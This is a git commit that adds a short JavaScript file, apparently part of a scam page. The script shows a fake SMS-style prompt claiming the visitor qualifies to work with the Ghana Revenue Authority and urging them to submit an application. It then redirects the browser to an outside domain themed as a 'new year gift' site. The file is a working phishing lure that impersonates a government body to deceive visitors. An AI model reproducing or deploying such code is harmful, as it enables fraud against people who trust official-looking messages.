8d3951a7366007c24ea608f8f7e3216db8e7fc1f
ukebeblog <esther001imoh@gmail.com>
2025-01-11 21:16:14 +0100

    Create ghana-active.js

---
+++ ghana-active.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulations You are qualify to work with the Ghana Revenue Authority, Kindly Press OK to submit apllication   ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://newyr-gift.org/ghana-revenue.html';
+}
